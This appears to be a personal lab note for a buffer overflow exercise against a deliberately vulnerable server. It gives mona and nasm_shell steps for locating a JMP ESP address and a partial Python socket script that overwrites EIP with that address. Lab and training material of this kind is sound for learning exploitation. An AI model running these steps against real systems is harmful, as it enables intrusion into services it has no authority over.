Stage 5

# Buffer Overflow 5

*In immunity debugger:*
1. !mona modules
2. look for something attached to target that has no Protection Settings
3. Record a suitable value

**Now in kali:**
4.  /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
nasm > JMP ESP
FFE4

**In immunity debugger:**
5. !mona find -s “\xff\xe4” -m essfunc.dll
6. Take note of all values
```
#!/usr/bin/python
import os
import sys
import socket
from time import sleep
host = "10.0.0.134"
port = 9999

#for example if value equalled 625011af
#you would do this(reverse it kinda)

shellcode= 'A'* <offset> + "\xaf\x11\x50\x62"

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host,port))

    s.send("<string> + shellcode)
    s.close()
except:
    print("error connecting to server")
    sys.exit()
    
 ```   
**In Immunity Debugger:**
7. Click blue/black arrow to follow an expression
8. enter the value we are trying(verify it is jmp)
9. Hit F2 on that JMP code so that it breaks there
10. Run python file
11. Check the EIP is going to the correct jmp 
